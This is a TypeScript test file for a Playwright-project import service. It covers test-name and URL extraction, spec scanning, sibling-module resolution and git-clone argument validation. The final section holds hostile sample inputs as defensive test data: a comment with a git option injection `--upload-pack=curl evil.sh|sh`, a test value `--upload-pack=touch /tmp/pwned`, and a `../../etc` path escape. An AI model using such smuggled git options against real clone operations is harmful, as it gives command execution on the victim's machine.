// Tests for importing existing Playwright projects.
//
// These four helpers decide what the user actually sees after an import: the
// test's name and URL in the sidebar, which files get scanned, and which
// sibling modules are copied so the spec still runs once it's away from its
// original folder. Getting any of them wrong produces a library full of
// mis-named tests or specs that fail on first run with "cannot find module".
//
// Driven against real temp directories rather than a mocked fs — the logic IS
// filesystem behavior (extension probing, index files, depth limits), so a
// mock would only assert my assumptions back at me.

import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { extractName, extractUrl, importService, resolveSibling, scanDir } from "./import-service.js";

let root: string;

beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), "glaze-import-test-"));
});

afterEach(() => {
  fs.rmSync(root, { recursive: true, force: true });
});

function write(rel: string, content = "") {
  const full = path.join(root, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, content, "utf-8");
  return full;
}

describe("extractName", () => {
  it("prefers the first test() title", () => {
    expect(extractName('test("Checkout flow", async () => {});', "/x/a.spec.ts")).toBe(
      "Checkout flow",
    );
  });

  it("handles test.only / test.describe-style modifiers", () => {
    expect(extractName('test.only("Focused", async () => {});', "/x/a.spec.ts")).toBe("Focused");
  });

  it("accepts single quotes and backticks", () => {
    expect(extractName("test('Single', async () => {});", "/x/a.spec.ts")).toBe("Single");
    expect(extractName("test(`Backtick`, async () => {});", "/x/a.spec.ts")).toBe("Backtick");
  });

  it("falls back to the file name when there's no title", () => {
    expect(extractName("// no tests here", "/x/login.spec.ts")).toBe("login");
  });

  it("falls back when the title is blank rather than naming a test ''", () => {
    expect(extractName('test("   ", async () => {});', "/x/login.spec.ts")).toBe("login");
  });
});

describe("extractUrl", () => {
  // An absolute target now comes back as `URL.href` — every URL this module
  // yields goes through the same gate a typed-in base URL does, which is what
  // keeps a `file:` or `javascript:` goto from ever reaching the record. The
  // visible cost is normalization: a bare origin gains its trailing slash.
  it("takes the first goto", () => {
    expect(extractUrl('await page.goto("https://a.test");await page.goto("https://b.test");')).toBe(
      "https://a.test/",
    );
  });

  it("returns empty when there is no goto rather than inventing one", () => {
    expect(extractUrl("await page.click('#go');")).toBe("");
  });

  it("handles all quote styles", () => {
    expect(extractUrl("page.goto('https://s.test')")).toBe("https://s.test/");
    expect(extractUrl("page.goto(`https://b.test`)")).toBe("https://b.test/");
  });

  it("still prefers an absolute goto over the project's base URL", () => {
    // A spec that names its own destination is not asking for one.
    expect(extractUrl('await page.goto("https://a.test/x");', "https://base.test/")).toBe(
      "https://a.test/x",
    );
  });

  it("resolves a relative goto against the project's base URL", () => {
    // `page.goto("/cart")` is the idiomatic way to write a navigation WITH a
    // baseURL, so this is what most imported suites look like.
    expect(extractUrl('await page.goto("/cart");', "https://shop.test/")).toBe(
      "https://shop.test/cart",
    );
  });

  it("returns empty for a relative goto with no base URL, rather than '/'", () => {
    // Storing "/" would look like a URL to everything downstream that treats
    // this field as one — the sidebar, the run header, the MCP payload — and
    // there is no honest answer until somebody supplies a base URL.
    expect(extractUrl('await page.goto("/cart");')).toBe("");
  });

  it("finds a goto wrapped in the project's own navigation helper", () => {
    // A `.goto(` pattern matches `page.goto(` and nothing else, so a suite that
    // routes every navigation through `gotoWithRetry(page, "/cart")` looked
    // like it had no navigations at all — and therefore no need of a base URL.
    expect(extractUrl('await gotoWithRetry(page, "/cart");', "https://shop.test/")).toBe(
      "https://shop.test/cart",
    );
  });

  it("falls back to the base URL itself when the spec names no navigation", () => {
    expect(extractUrl("await page.click('#go');", "https://shop.test/")).toBe("https://shop.test/");
  });
});

describe("scanDir", () => {
  it("finds .spec and .test files", () => {
    write("a.spec.ts", "test('a', () => {})");
    write("b.test.ts", "test('b', () => {})");
    const found = scanDir(root);
    expect(found.map((f) => path.basename(f.filePath)).sort()).toEqual(["a.spec.ts", "b.test.ts"]);
  });

  it("ignores files that aren't tests", () => {
    write("helpers.ts", "export const a = 1;");
    write("README.md", "# hi");
    expect(scanDir(root)).toHaveLength(0);
  });

  it("recurses into subdirectories", () => {
    write("suites/deep/c.spec.ts", "test('c', () => {})");
    expect(scanDir(root)).toHaveLength(1);
  });

  it("skips node_modules and dot-directories", () => {
    // Scanning node_modules would import thousands of a dependency's own tests.
    write("node_modules/pkg/x.spec.ts", "test('x', () => {})");
    write(".git/y.spec.ts", "test('y', () => {})");
    write("real.spec.ts", "test('real', () => {})");
    const found = scanDir(root);
    expect(found).toHaveLength(1);
    expect(path.basename(found[0].filePath)).toBe("real.spec.ts");
  });

  it("reads file contents alongside the path", () => {
    write("a.spec.ts", "test('has content', () => {})");
    expect(scanDir(root)[0].content).toContain("has content");
  });

  it("returns nothing for an empty or missing directory", () => {
    expect(scanDir(root)).toHaveLength(0);
    expect(scanDir(path.join(root, "does-not-exist"))).toHaveLength(0);
  });
});

describe("resolveSibling", () => {
  it("resolves an exact relative path", () => {
    const target = write("helpers.ts", "");
    expect(resolveSibling(root, "./helpers.ts")).toBe(target);
  });

  it("probes extensions when the import omits one", () => {
    // `import "./helpers"` is the common style and must still be copied, or the
    // imported spec fails at run time with "cannot find module".
    const target = write("helpers.ts", "");
    expect(resolveSibling(root, "./helpers")).toBe(target);
  });

  it("resolves a directory to its index file", () => {
    const target = write("utils/index.ts", "");
    expect(resolveSibling(root, "./utils")).toBe(target);
  });

  it("resolves a parent-relative import", () => {
    const target = write("shared.ts", "");
    fs.mkdirSync(path.join(root, "specs"), { recursive: true });
    expect(resolveSibling(path.join(root, "specs"), "../shared.ts")).toBe(target);
  });

  it("returns null for something that doesn't exist", () => {
    expect(resolveSibling(root, "./nope")).toBeNull();
  });

  it("returns null for a directory with no index file", () => {
    fs.mkdirSync(path.join(root, "emptydir"), { recursive: true });
    expect(resolveSibling(root, "./emptydir")).toBeNull();
  });
});

// ── The git clone's arguments are the untrusted-input boundary ────────────
//
// A repository URL and a branch ref are both text somebody else chose, and both
// reach `git` as ARGUMENTS. `execFile` spawns no shell, so quoting is not the
// question — the branch switcher's rule is the one that applies: a ref called
// `--upload-pack=curl evil.sh|sh` is not injection, it is an option git honours,
// and rejecting a leading `-` is what stops it.
//
// These assert the REJECTION, which happens before `mkdtemp` and before any
// process is spawned — so no test here shells out to git.
describe("importFromGit's argument validation", () => {
  it("refuses a ref that git would read as an option", async () => {
    await expect(
      importService.importFromGit("https://example.com/r.git", "--upload-pack=touch /tmp/pwned"),
    ).rejects.toThrow(/would be read by git as an option/);
  });

  it("refuses a ref that would escape into a parent path", async () => {
    await expect(
      importService.importFromGit("https://example.com/r.git", "../../etc"),
    ).rejects.toThrow(/may not contain/);
  });

  it("refuses a URL with no recognised scheme", async () => {
    await expect(importService.importFromGit("example.com/r.git")).rejects.toThrow(
      /valid git URL/,
    );
  });

  it("refuses an empty URL", async () => {
    await expect(importService.importFromGit("   ")).rejects.toThrow(/URL is required/);
  });

  it("accepts an ordinary branch name (it gets as far as trying to clone)", async () => {
    // The control. Without it every assertion above passes against a function
    // that rejects everything, which is the failure mode a validator has.
    // "gets as far as cloning" is asserted as NOT the validation message —
    // the clone itself fails, since the URL is not a real repository.
    await expect(
      importService.importFromGit("https://127.0.0.1:1/nope.git", "release/2.0"),
    ).rejects.toThrow(/clone|git is not installed/i);
  });
});
